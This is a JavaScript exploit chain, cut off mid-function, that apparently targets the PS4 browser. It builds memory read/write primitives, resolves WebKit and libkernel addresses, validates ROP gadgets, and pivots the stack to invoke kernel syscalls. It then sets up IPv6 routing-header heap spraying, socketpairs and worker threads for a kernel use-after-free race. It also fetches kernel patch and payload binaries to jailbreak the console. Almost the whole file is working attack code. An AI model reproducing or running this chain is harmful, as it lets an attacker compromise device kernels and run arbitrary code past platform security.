// chain_poops_v12.js — NO cerrar el kqueue antes de probar candidatos
import { establishPrimitive } from "./core.js?v=10";
import { installWindowP, pairStatus } from "./mem.js";
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets.js";

const outEl = document.getElementById("out");
const stateEl = document.getElementById("state");
const lines = [];
let passCount = 0, failCount = 0;
const params = new URLSearchParams(location.search);
const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";

// ============================================================
// AJUSTES
// ============================================================
const CFG_IOV_WORKERS   = 1;
const CFG_UIO_WORKERS   = 1;
const CFG_ATTEMPTS      = 4;
const CFG_MSDELAY       = 2;
const CFG_USE_REALTIME  = 0;
const CFG_USE_PAIR      = 0;
const CFG_VERBOSE       = 1;
const CFG_DO_MAKE_KARW  = 1;
const CFG_DO_JAILBREAK  = 1;
const CFG_DO_KPATCH     = 1;
const CFG_DO_PAYLOAD    = 1;
const CFG_KARW_MAX_ATTEMPTS = 4;
// ============================================================

const TM = window.__TM = window.__TM || { startedAt: Date.now(), errors: [], stages: {}, diagnostics: {} };
function tmStage(tag, detail) {
    try {
        const now = Date.now() - TM.startedAt;
        if (!TM.stages[tag]) TM.stages[tag] = { count: 0, first: null, last: null, samples: [] };
        const s = TM.stages[tag];
        s.count++;
        const text = String(detail || '').slice(0, 120);
        if (!s.first) s.first = { ts: now, detail: text };
        s.last = { ts: now, detail: text };
        if (s.samples.length < 3) s.samples.push({ ts: now, detail: text });
        if (window.__TM.render) window.__TM.render();
    } catch (e) { }
}
function tmDiag(name, value) {
    try { if (window.__TM) { window.__TM.diagnostics[name] = value; if (window.__TM.render) window.__TM.render(); } } catch (e) { }
}
function post(tag, detail) {
    try {
        tmStage(tag, detail);
        const x = new XMLHttpRequest();
        x.open("POST", "t", true);
        x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        x.send("PS4-S10&tag=" + encodeURIComponent(tag) + "&detail=" + encodeURIComponent(String(detail == null ? "" : detail)));
    } catch (e) { }
}
const VERBOSE = CFG_VERBOSE === 1 || params.get("verbose") === "1";
const PROSE = [/ -- /, /\.\s/, /;\s/, /,\s+(which|so|and that|because|since|as that)\s/, /\s+(because|rather than|instead of|so that|which is|which means|which the|so the)\s/, /\s+so\s+[a-z]/, /\s+\([a-z][^)]{40,}\)/];
function terse(s) {
    if (VERBOSE || s == null) return s;
    s = String(s);
    for (const re of PROSE) { const m = re.exec(s); if (m && m.index > 0) s = s.slice(0, m.index); }
    s = s.replace(/\s+$/, "");
    if (s.length > 140) s = s.slice(0, 140) + "...";
    return s;
}
function mark(tag, detail) {
    const raw = detail;
    detail = terse(detail);
    lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
    const esc = t => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
    outEl.innerHTML = lines.map(function (l) {
        l = esc(l);
        const c = /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED/i.test(l) ? "bad"
                : /WARN|SKIP|REFUSED|COMMITTED|DIRTY/i.test(l) ? "warn"
                : /\bOK\b|PASS|ACHIEVED|RUNNING|ARMED/i.test(l) ? "ok" : "";
        return c ? '<span class="' + c + '">' + l + "</span>" : l;
    }).join("\n");
    outEl.scrollTop = outEl.scrollHeight;
    post(tag, raw);
}
function trace(tag, detail) { if (VERBOSE) mark(tag, detail); else post(tag, detail); }
function state(t, c) { stateEl.textContent = t; stateEl.className = c || ""; }
function check(name, ok, detail) {
    try {
        if (window.__TM) {
            window.__TM.diagnostics[name] = ok ? 'PASS' : 'FAIL';
            if (!ok) window.__TM.errors.push({ ts: Date.now() - window.__TM.startedAt, message: 'CHECK-FAIL: ' + name + '  ' + (detail || ''), file: 'chain_poops_v12.js', line: 0, col: 0, stack: '' });
            if (window.__TM.render) window.__TM.render();
        }
    } catch (e) { }
    if (ok) { passCount++; mark("PROOF-OK", name + (detail ? "  " + detail : "")); }
    else { failCount++; mark("PROOF-FAIL", name + (detail ? "  " + detail : "")); }
    return ok;
}
function hx(n) { return "0x" + (n >>> 0).toString(16); }

const SYS = { read: 3, write: 4, close: 6, getpid: 20, setuid: 0x17,
              getuid: 0x18, dup: 0x29, sendmsg: 0x1c, recvmsg: 0x1b,
              socket: 0x61, netcontrol: 0x63, socketpair: 0x87, kqueue: 0x16a,
              readv: 0x78, writev: 0x79, sysctl: 0xca, pipe: 0x2a, fcntl: 0x5c,
              setsockopt: 0x69, getsockopt: 0x76, sched_yield: 0x14b,
              rtprio_thread: 0x1d2, cpuset_setaffinity: 0x1e8,
              cpuset_getaffinity: 0x1e7, thr_self: 432,
              ioctl: 0x36, mmap: 0x1dd, jitshm_create: 0x215, kexec: 0x295,
              nanosleep: 0xf0 };
const SYS_NAMES = Object.keys(SYS);

const NETEVENT_SET_QUEUE = 0x20000003, NETEVENT_CLEAR_QUEUE = 0x20000007;
const AF_UNIX = 1, AF_INET6 = 28, SOCK_STREAM = 1;
const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
const UCRED_SIZE = 0x168;
const KQUEUE_SIZE = 0x100;
const NUM_LEAK_KQUEUE = 5000;
const KQ_BATCH = 8;
const KQ_HDR_MAGIC = 0x1430000;
const NUM_UIO_IOV = 0x14, UIO_SIZE = 0x30;
const NUM_UIO_SPRAY = 512;
const NUM_IOV_SPRAY_MAX = 100000;
const UIO_READ = 0, UIO_WRITE = 1, UIO_SYSSPACE = 1;
const SOL_SOCKET = 0xffff, SO_SNDBUF = 0x1001, SO_RCVBUF = 0x1002;
const PIPEBUF_SIZEOF = 0x18, PIPE_PAGE = 0x4000, FILEDESCENT_SIZE = 8;
const F_SETFL = 4, O_NONBLOCK = 4;
const IP6_RTHDR0_SIZE = 8, IN6_ADDR_SIZE = 0x10;
const NUM_MSG_IOV = 0x17, IOVEC_SIZE = 0x10, MSGHDR_SIZE = 0x30;
const NUM_IPV6_SOCK = 0x100;
const RTHDR_TAG = 0x13370000;
const MAX_ROUNDS_TWIN = 15;
const MAX_ROUNDS_TRIPLET = 800;
const FIND_TRIPLET_FAST = 8000;
const RTP_PRIO_REALTIME = 2, RTP = 0x100, RTP_SET = 1, MAIN_CORE = 7;
const RTP_LOOKUP = 0, RTP_PRIO_NORMAL = 0;
const CPU_LEVEL_WHICH = 3, CPU_WHICH_TID = 1;
const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);

const keepAlive = [];
const workers = [];
let mainMf = null, mainOrig = null, mainArmed = false;
let committed = false, rebootRequired = false;
let kreadPoisoned = false;
let uafSock = 0;
let savedMask = null, savedPrio = null, restoreCtx = null, attrsRestored = false;
let allDone = false;
let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe = null;

(async function () {
    let p = null;
    let sc = null;

    try {
        const NUM_IOV_WORKER = CFG_IOV_WORKERS;
        const NUM_ATTEMPT = CFG_ATTEMPTS;
        const NUM_IOV_SPRAY = params.has("spray") ? parseInt(params.get("spray"), 10) : 0x200;
        const MS_DELAY = CFG_MSDELAY;

        mark("SYS-TABLE", "entries=" + SYS_NAMES.length);
        const { key, off } = offsetsFor(navigator.userAgent);
        mark("FW", key || "(not a PS4 UA)");
        if (!off) { state("no offsets", "bad"); return; }
        mark("FW-STATUS", off.fw_status || "none");
        mark("PLAN", "iov=" + NUM_IOV_WORKER + " uio=" + CFG_UIO_WORKERS
            + " attempts=" + NUM_ATTEMPT + " msdelay=" + MS_DELAY
            + " karw_attempts=" + CFG_KARW_MAX_ATTEMPTS);
        tmDiag('fw_key', key);

        let kpatch = null, aiofix = null, payload = null;
        const kpatchName = off && off.kpatch ? "patches/" + off.kpatch
            : key ? "patches/" + key.replace(".", "") + ".bin" : null;
        const KPATCH_JMP_SITES = [];
        try {
            if (kpatchName) {
                const r = await fetch(kpatchName);
                if (r.ok) kpatch = new Uint8Array(await r.arrayBuffer());
            }
        } catch (e) { mark("KPATCH-FETCH-THREW", e.message); }
        if (kpatch) {
            for (let i = 0; i + 7 <= kpatch.length; ++i) {
                if (kpatch[i] !== 0xc6 || kpatch[i + 1] !== 0x81) continue;
                if (kpatch[i + 6] !== 0xeb) continue;
                KPATCH_JMP_SITES.push(((kpatch[i + 2]) | (kpatch[i + 3] << 8)
                    | (kpatch[i + 4] << 16) | (kpatch[i + 5] << 24)) >>> 0);
            }
        }
        mark("KPATCH-BLOB", kpatch ? "bytes=" + kpatch.length + " sites=" + KPATCH_JMP_SITES.length : "MISSING");
        try {
            const r = await fetch("aiofix.bin?t=" + Date.now());
            if (r.ok) aiofix = new Uint8Array(await r.arrayBuffer());
        } catch (e) { mark("AIOFIX-FETCH-THREW", e.message); }
        mark("AIOFIX-BLOB", aiofix ? "bytes=" + aiofix.length + " magic=" + (aiofix[0] === 0x7f ? "ELF" : "0x" + aiofix[0].toString(16)) : "MISSING");
        try {
            const r = await fetch("payload.bin?t=" + Date.now());
            if (r.ok) payload = new Uint8Array(await r.arrayBuffer());
        } catch (e) { mark("PAYLOAD-FETCH-THREW", e.message); }
        mark("PAYLOAD-BLOB", payload ? "bytes=" + payload.length + " magic=" + (payload[0] === 0xe9 ? "e9-jmp" : "0x" + payload[0].toString(16)) : "MISSING");

        state("running primitive...", "warn");
        await new Promise(r => setTimeout(r, 0));
        const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
        const carrier = await establishPrimitive({
            maxAttempts: 12,
            onEvent: (t, d, a) => (PRIMITIVE_LOUD.test(t) ? mark : trace)(t, (a != null ? "[" + a + "] " : "") + (d || ""))
        });
        installWindowP(carrier, {
            promote: CFG_USE_PAIR === 1,
            onEvent: (t, d) => (PRIMITIVE_LOUD.test(t) ? mark : trace)(t, d || "")
        });
        if (!window.p) throw new Error("window.p not installed");
        p = window.p;
        mark("PRIMITIVE-OK", "");

        const cell = p.leakval(Math.expm1);
        const nativeFn = p.read8(p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function));
        const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
        const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
        const libkernelBase = errorFn.sub32(off.k__error);
        mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
        const aligned = v => v.hi > 0 && (v.low & 0x3fff) === 0;
        if (!check("module-bases-aligned", aligned(webkitBase) && aligned(libkernelBase), "")) return;

        const G = {};
        const GAD = [
            ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3]],
            ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3]],
            ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3]],
            ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3]],
            ["POP_R8_RET", off.wk_POP_R8_RET, [null, 0x58, 0xc3]],
            ["POP_R9_RET", off.wk_POP_R9_RET, [null, 0x59, 0xc3]],
            ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3]],
            ["LEAVE_RET", off.wk_LEAVE_RET, [0xc9, 0xc3]],
            ["MOV_RDI_RAX_RET", off.wk_MOV_QWORD_PTR_RDI_RAX_RET, [0x48, 0x89, 0x07, 0xc3]],
            ["G0", off.wk_MOV_RDI_RSI_30_CALL, [0x48, 0x8b, 0x7e, 0x30]],
            ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18, [0x58, 0x48, 0x8b, 0x07]],
            ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10, [0x55, 0x48, 0x89, 0xe5]],
            ["G3", off.wk_MOV_RDI_RAX_8_CALL_20, [0x48, 0x8b, 0x78, 0x08]],
            ["G4", off.wk_MOV_RDX_RAX_18_CALL_10, [0x48, 0x8b, 0x50, off.pivot_view_sp]],
            ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [0x52, 0x5c, 0xc3]],
        ];
        let gated = 0;
        for (const [nm, rva, pat] of GAD) {
            const a = webkitBase.add32(rva);
            let good = true;
            for (let i = 0; i < pat.length; ++i) {
                if (pat[i] === null) continue;
                if (p.read1(a.add32(i)) !== pat[i]) { good = false; break; }
            }
            if (good) { G[nm] = a; gated++; } else mark("GADGET-BAD", nm);
        }
        if (!check("gadget-table", gated === GAD.length, gated + "/" + GAD.length)) return;
        const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET, G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];

        const stubAddr = new Map();
        let seeded = 0;
        if (off.k_stubs) {
            for (const numStr in off.k_stubs) {
                const num = +numStr, o = off.k_stubs[numStr];
                const v = p.read8(libkernelBase.add32(o));
                if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
                if ((((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0) !== num) continue;
                stubAddr.set(num, libkernelBase.add32(o)); seeded++;
            }
        }
        const need = new Set(Object.keys(SYS).map(k => SYS[k]).filter(n => !stubAddr.has(n)));
        let scanned = 0;
        for (let o = 0; o < off.k_scan_stage1 && need.size; o += 16) {
            const v = p.read8(libkernelBase.add32(o));
            if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
            const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
            if (!need.has(num)) continue;
            stubAddr.set(num, libkernelBase.add32(o)); need.delete(num); scanned++;
        }
        mark("STUBS", "seeded=" + seeded + " scanned=" + scanned);
        const miss = Object.keys(SYS).filter(k => !stubAddr.has(SYS[k]));
        if (!check("syscall-needs-stub", miss.length === 0, miss.join(","))) return;

        function bufAddr(ab) {
            const c = p.leakval(ab);
            return p.read8(p.read8(c.add32(off.wk_ArrayBuffer_m_impl)).add32(off.wk_ArrayBuffer_m_contents_m_data));
        }
        function put(dv, at, v) {
            if (typeof v === "number") { dv.setUint32(at, v >>> 0, true); dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true); }
            else { dv.setUint32(at, v.low >>> 0, true); dv.setUint32(at + 4, v.hi >>> 0, true); }
        }
        const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);
        function makeCtx() {
            const sb = new ArrayBuffer(0x20), pb = new ArrayBuffer(PB_SIZE);
            const kb = new ArrayBuffer(0x2000), fb = new ArrayBuffer(0x40);
            keepAlive.push(sb, pb, kb, fb);
            const c = { storeDv: new DataView(sb), pivotDv: new DataView(pb), stackDv: new DataView(kb), frameDv: new DataView(fb), stackU8: new Uint8Array(kb), frameU8: new Uint8Array(fb) };
            keepAlive.push(c.storeDv, c.pivotDv, c.stackDv, c.frameDv, c.stackU8, c.frameU8);
            c.S = bufAddr(sb); c.P = bufAddr(pb); c.K = bufAddr(kb); c.F = bufAddr(fb);
            put(c.storeDv, 0x00, G.G1); put(c.storeDv, 0x08, c.P);
            put(c.storeDv, 0x10, G.G3); put(c.storeDv, 0x18, G.G2);
            put(c.pivotDv, 0x00, c.P); put(c.pivotDv, 0x10, G.G5);
            put(c.pivotDv, 0x20, G.G4);
            return c;
        }
        function layout(c, target, args) {
            c.stackU8.fill(0); c.frameU8.fill(0);
            const insts = [];
            for (let i = 0; i < args.length; ++i) {
                if (!argGadget[i] || typeof argGadget[i].low !== "number") throw new Error("layout: arg[" + i + "]");
                insts.push(argGadget[i]); insts.push(args[i]);
            }
            const targetIdx = insts.length;
            insts.push(target);
            insts.push(G.POP_RDI_RET); insts.push(c.F);
            insts.push(G.MOV_RDI_RAX_RET);
            insts.push(G.POP_RAX_RET); insts.push(JSVALUE_UNDEFINED);
            insts.push(G.LEAVE_RET);
            let at = 0x2000 - 8 * insts.length;
            if (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
            for (let i = 0; i < insts.length; ++i) put(c.stackDv, at + 8 * i, insts[i]);
            put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
        }
        const M = makeCtx();
        mainMf = p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
        mainOrig = p.read8(mainMf);
        const pivotObj = {};
        keepAlive.push(pivotObj);

        let pivotCell = null;
        try { pivotCell = p.leakval(pivotObj); } catch (le) { mark("PIVOT-LEAKVAL-THREW", le.message); }
        if (!pivotCell || typeof pivotCell.low !== "number") { state("primitiva inestable", "bad"); return; }
        p.write8(mainMf, G.G0);
        mainArmed = true;

        function callAddr(target, args) {
            if (!target || typeof target.low !== "number") throw new Error("callAddr: bad target");
            layout(M, target, args);
            const saved = p.read8(pivotCell);
            if (!saved || typeof saved.low !== "number") throw new Error("callAddr: read8(pivotCell)");
            p.write8(pivotCell, M.S);
            Math.expm1(pivotObj);
            p.write8(pivotCell, saved);
            return { lo: M.frameDv.getUint32(0, true), hi: M.frameDv.getUint32(4, true), i32: M.frameDv.getUint32(0, true) | 0 };
        }
        sc = function (num) {
            const a = Array.prototype.slice.call(arguments, 1);
            if (typeof num !== "number") throw new Error("sc: num=" + num);
            const stub = stubAddr.get(num);
            if (!stub) throw new Error("sc: no stub " + num);
            return callAddr(stub, a);
        };
        function errno() {
            const r = callAddr(errorFn, []);
            const a = new int64(r.lo, r.hi);
            return (a.hi === 0 && a.low === 0) ? -1 : p.read4(a) | 0;
        }
        const pid = sc(SYS.getpid).i32;
        check("chain-reaches-kernel", pid > 0, "pid=" + pid + " uid=" + sc(SYS.getuid).i32);

        const scratchAb = new ArrayBuffer(0x2000); keepAlive.push(scratchAb);
        const scratch = bufAddr(scratchAb);
        const argAb = new ArrayBuffer(8); keepAlive.push(argAb);
        const argAddr = bufAddr(argAb), argDv = new DataView(argAb);
        const lenAb = new ArrayBuffer(0x10); keepAlive.push(lenAb);
        const lenAddr = bufAddr(lenAb), lenDv = new DataView(lenAb);

        function nanosleepMs(ms) {
            const sec = Math.floor(ms / 1000);
            const nsec = ((ms % 1000) * 1000000) >>> 0;
            lenDv.setUint32(0, sec, true); lenDv.setUint32(4, 0, true);
            lenDv.setUint32(8, nsec, true); lenDv.setUint32(12, 0, true);
            return sc(SYS.nanosleep, lenAddr, 0).i32;
        }

        const sprayAb = new ArrayBuffer(UCRED_SIZE); keepAlive.push(sprayAb);
        const sprayAddr = bufAddr(sprayAb), sprayDv = new DataView(sprayAb);
        const leakAb = new ArrayBuffer(UCRED_SIZE); keepAlive.push(leakAb);
        const leakAddr = bufAddr(leakAb), leakDv = new DataView(leakAb);
        const leakU8 = new Uint8Array(leakAb);
        const R2_ON = params.get("r2") !== "0";
        let shortReads = 0;

        const burned = new Set();
        function burn(fd, why) { if (fd > 0 && !burned.has(fd)) { burned.add(fd); mark("BURNED", "fd=" + fd + " " + why); } }

        function buildRthdr(dv, size) {
            const n = Math.floor((size - IP6_RTHDR0_SIZE) / IN6_ADDR_SIZE);
            new Uint8Array(dv.buffer).fill(0);
            dv.setUint8(0, 0); dv.setUint8(1, n * 2); dv.setUint8(2, 0); dv.setUint8(3, n);
            return IP6_RTHDR0_SIZE + IN6_ADDR_SIZE * n;
        }
        const sprayLen = buildRthdr(sprayDv, UCRED_SIZE);
        const setRthdr = s => sc(SYS.setsockopt, s, IPPROTO_IPV6, IPV6_RTHDR, sprayAddr, sprayLen).i32;
        const freeRthdr = s => {
            if (burned.has(s)) return -1;
            return sc(SYS.setsockopt, s, IPPROTO_IPV6, IPV6_RTHDR, 0, 0).i32;
        };
        function getRthdr(s, size, need) {
            if (R2_ON) leakU8.fill(0xee, 0, Math.min(size, UCRED_SIZE));
            lenDv.setUint32(0, size, true);
            const rv = sc(SYS.getsockopt, s, IPPROTO_IPV6, IPV6_RTHDR, leakAddr, lenAddr).i32;
            if (rv !== 0) return -1;
            const got = lenDv.getUint32(0, true);
            if (R2_ON && need !== undefined && got < need) { shortReads++; return -1; }
            return got;
        }
        function netevent(sock, event) {
            argDv.setUint32(0, sock >>> 0, true); argDv.setUint32(4, 0, true);
            const r = sc(SYS.netcontrol, -1, event, argAddr, 8).i32;
            return { rv: r, err: r === -1 ? errno() : 0 };
        }

        const iovAb = new ArrayBuffer(IOVEC_SIZE * NUM_MSG_IOV);
        const msgAb = new ArrayBuffer(MSGHDR_SIZE);
        keepAlive.push(iovAb, msgAb);
        const iovAddr = bufAddr(iovAb), msgAddr = bufAddr(msgAb);
        const iovDv = new DataView(iovAb), msgDv = new DataView(msgAb);
        new Uint8Array(iovAb).fill(0); put(iovDv, 0, 1); put(iovDv, 8, 1);
        new Uint8Array(msgAb).fill(0); put(msgDv, 0x10, iovAddr); msgDv.setInt32(0x18, NUM_MSG_IOV, true);

        state("setting up...", "warn");
        if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1) throw new Error("iov socketpair failed");
        const iovSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
        if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1) throw new Error("uio socketpair failed");
        const uioSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];

        // Sin setsockopt grandes (evita fragmentar el heap del kernel)
        mark("IOV-SS", "iov=" + iovSs.join(",") + " uio=" + uioSs.join(",") + " (sin setsockopt)");

        if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("master pipe failed");
        const masterPipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
        if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("slave pipe failed");
        const slavePipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
        check("karw-pipe-pairs", masterPipe[0] > 0 && masterPipe[1] > 0 && slavePipe[0] > 0 && slavePipe[1] > 0, "m=" + masterPipe + " s=" + slavePipe);

        const dummyAb = new ArrayBuffer(0x1000); keepAlive.push(dummyAb);
        new Uint8Array(dummyAb).fill(0x41);
        const dummyAddr = bufAddr(dummyAb);
        const uioIovAb = new ArrayBuffer(IOVEC_SIZE * NUM_UIO_IOV);
        keepAlive.push(uioIovAb);
        const uioIovAddr = bufAddr(uioIovAb), uioIovDv = new DataView(uioIovAb);
        new Uint8Array(uioIovAb).fill(0); put(uioIovDv, 0, dummyAddr);
        const ipv6 = [];
        for (let i = 0; i < NUM_IPV6_SOCK; ++i) {
            const s = sc(SYS.socket, AF_INET6, SOCK_STREAM, 0).i32;
            if (s === -1) break;
            ipv6.push(s);
        }
        _ipv6 = ipv6; _iovSs = iovSs; _uioSs = uioSs; _masterPipe = masterPipe; _slavePipe = slavePipe;
        check("reclaim-sockets", ipv6.length === NUM_IPV6_SOCK, ipv6.length + "/" + NUM_IPV6_SOCK);

        function makeRpc(w, name) {
            let seq = 0;
            const pending = new Map();
            w.onmessage = function (e) {
                const d = e.data || {};
                const slot = pending.get(d.id);
                if (!slot) return;
                pending.delete(d.id);
                if (slot.timer) clearTimeout(slot.timer);
                if (d.type === "err") slot.reject(new Error(String(d.value)));
                else slot.resolve(d.value);
            };
            w.onerror = e => mark("WORKER-ONERROR", name + " " + ((e && e.message) ? e.message : String(e)));
            return function call(fname, timeoutMs) {
                const extra = Array.prototype.slice.call(arguments, 2);
                return new Promise(function (resolve, reject) {
                    const id = seq++;
                    const timer = timeoutMs > 0 ? setTimeout(function () { pending.delete(id); reject(new Error(name + ": timeout " + fname)); }, timeoutMs) : null;
                    pending.set(id, { resolve, reject, timer });
                    w.postMessage({ id: id, name: fname, args: extra });
                });
            };
        }
        function ptrish(v) { return v && v.hi > 0 && v.hi < 0x10000 && (v.low & 7) === 0; }

        const NUM_UIO_WORKER = CFG_UIO_WORKERS;
        const TOTAL_WORKERS = NUM_IOV_WORKER + NUM_UIO_WORKER;
        state("bringing up " + TOTAL_WORKERS + " workers...", "warn");
        for (let i = 0; i < TOTAL_WORKERS; ++i) {
            const name = (i < NUM_IOV_WORKER ? "iov" : "uio") + (i < NUM_IOV_WORKER ? i : i - NUM_IOV_WORKER);
            const w = { name: name, armed: false, wired: false };
            workers.push(w);
            try {
                w.worker = new Worker("rpc_worker.js");
                w.rpc = makeRpc(w.worker, name);
                if ((await w.rpc("ping", 5000)) !== "pong") throw new Error(name + " no pong");
                const sLo = (0x10100000 | i) >>> 0, sHi = (0xc0de0000 | i) >>> 0;
                const arr = await w.rpc("init", 5000, sLo, sHi);
                keepAlive.push(arr);
                const D = bufAddr(arr.buffer);
                if ((p.read4(D) >>> 0) !== sLo) throw new Error(name + ": transfer failed");
                const storage = p.read8(D.add32(0x10));
                const mc = ptrish(storage) ? p.read8(storage.add32(8)) : null;
                if (!mc || !ptrish(mc)) throw new Error(name + ": walk failed");
                const bf = p.read8(mc.add32(8));
                let wm = null, wv = null, wl = null;
                for (let k = 1; k <= 8; ++k) {
                    const val = p.read8(bf.sub32(8 * k));
                    if (!ptrish(val)) continue;
                    const inl = p.read8(val.add32(0x10));
                    const len = p.read4(val.add32(0x18)) >>> 0;
                    if (inl.hi === 0 && inl.low === 2) { if (!wl) wl = val; }
                    else if (inl.hi > 0 && len === 6) { if (!wm) wm = val; }
                    else if (inl.hi > 0 && len === 0x30) { if (!wv) wv = val; }
                }
                if (!(wm && wv && wl)) throw new Error(name + ": shapes not found");
                w.master = wm; w.origVector = p.read8(wm.add32(0x10));
                p.write8(wm.add32(0x10), wv); w.wired = true;
                await w.rpc("setup", 5000, wl.low, wl.hi);
                await w.rpc("armPivot", 5000, G.G0.low, G.G0.hi);
                w.armed = true;
                w.ctx = makeCtx();
                mark("WORKER-UP", name + " ok");
            } catch (workerErr) {
                mark("WORKER-FAILED", name + " " + (workerErr.message || String(workerErr)));
                try { if (w.worker) w.worker.terminate(); } catch (e) { }
                workers.pop();
                continue;
            }
            await new Promise(r => setTimeout(r, 100));
        }
        if (workers.length < 1) { state("TOO FEW WORKERS", "bad"); return; }
        const iovWorkers = workers.filter(w => w.name.startsWith("iov"));
        const uioWorkers = workers.filter(w => w.name.startsWith("uio"));
        mark("WORKER-POOLS", "iov=" + iovWorkers.length + " uio=" + uioWorkers.length);

        const prioAb = new ArrayBuffer(8), maskAb = new ArrayBuffer(0x10);
        keepAlive.push(prioAb, maskAb);
        const prioAddr = bufAddr(prioAb), maskAddr = bufAddr(maskAb);
        const prioDv = new DataView(prioAb), maskDv = new DataView(maskAb);

        new Uint8Array(maskAb).fill(0);
        sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID, new int64(0xffffffff, 0xffffffff), 0x10, maskAddr);
        savedMask = new int64(maskDv.getUint32(0, true), maskDv.getUint32(4, true));
        prioDv.setUint16(0, 0xffff, true); prioDv.setUint16(2, 0xffff, true);
        sc(SYS.rtprio_thread, RTP_LOOKUP, 0, prioAddr);
        savedPrio = [prioDv.getUint16(0, true), prioDv.getUint16(2, true)];

        async function restoreThreadAttrs(why) {
            if (attrsRestored || !savedMask || !savedPrio) return;
            attrsRestored = true;
            const ID = new int64(0xffffffff, 0xffffffff);
            new Uint8Array(maskAb).fill(0);
            maskDv.setUint32(0, savedMask.low, true); maskDv.setUint32(4, savedMask.hi, true);
            const ar = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID, ID, 0x10, maskAddr).i32;
            prioDv.setUint16(0, savedPrio[0], true); prioDv.setUint16(2, savedPrio[1], true);
            const pr = sc(SYS.rtprio_thread, RTP_SET, 0, prioAddr).i32;
            mark("THREAD-ATTRS-RESTORED", "at=" + why + " ar=" + ar + " pr=" + pr);
            let wr = 0, wn = 0;
            for (const w of workers) {
                try {
                    if (!w.armed) continue;
                    wn++;
                    new Uint8Array(maskAb).fill(0xff);
                    await fireW(w, SYS.cpuset_setaffinity, [CPU_LEVEL_WHICH, CPU_WHICH_TID, ID, 0x10, maskAddr], 3000);
                    prioDv.setUint16(0, RTP_PRIO_NORMAL, true); prioDv.setUint16(2, 0, true);
                    await fireW(w, SYS.rtprio_thread, [RTP_SET, 0, prioAddr], 3000);
                    wr++;
                } catch (e) { }
            }
            mark("WORKER-ATTRS-RESTORED", wr + "/" + wn);
        }
        restoreCtx = { restore: restoreThreadAttrs };
        mark("THREAD-ATTRS-SAVED", "mask=" + savedMask + " rtprio={" + savedPrio + "}");

        function fireW(w, num, args, timeoutMs) {
            layout(w.ctx, stubAddr.get(num), args);
            return w.rpc("fire", timeoutMs === undefined ? 3000 : timeoutMs, w.ctx.S.low, w.ctx.S.hi);
        }

        function tagFor(i) { return (RTHDR_TAG | (i & 0xffff)) >>> 0; }
        function readTag() {
            const v = leakDv.getUint32(4, true) >>> 0;
            return { ok: (v & 0xffff0000) >>> 0 === RTHDR_TAG, idx: v & 0xffff };
        }
        const sprayOk = new Array(NUM_IPV6_SOCK).fill(false);
        function findTwins(timeout) {
            for (let round = 0; round < timeout; ++round) {
                for (let i = 0; i < ipv6.length; ++i) {
                    if (burned.has(ipv6[i])) { sprayOk[i] = false; continue; }
                    sprayDv.setUint32(4, tagFor(i), true);
                    sprayOk[i] = setRthdr(ipv6[i]) === 0;
                }
                for (let i = 0; i < ipv6.length; ++i) {
                    if (R2_ON && !sprayOk[i]) continue;
                    if (getRthdr(ipv6[i], IP6_RTHDR0_SIZE, 8) < 0) continue;
                    const t = readTag();
                    if (t.ok && t.idx !== i && t.idx < ipv6.length) return { a: ipv6[i], b: ipv6[t.idx], round: round };
                }
                if ((round + 1) % 50 === 0) sc(SYS.sched_yield);
            }
            return null;
        }
        function findTriplet(master, slave, tag, timeout) {
            const baseRounds = timeout || MAX_ROUNDS_TRIPLET;
            let rounds = baseRounds, backoff = 0;
            while (backoff < 3) {
                const result = findTripletOnce(master, slave, tag, rounds);
                if (result) return result;
                backoff++; rounds = Math.min(rounds * 2, 2000);
                nanosleepMs(1);
            }
            return null;
        }
        function findTripletOnce(master, slave, tag, timeout) {
            const rounds = timeout || MAX_ROUNDS_TRIPLET;
            for (let round = 0; round < rounds; ++round) {
                for (let i = 0; i < ipv6.length; ++i) {
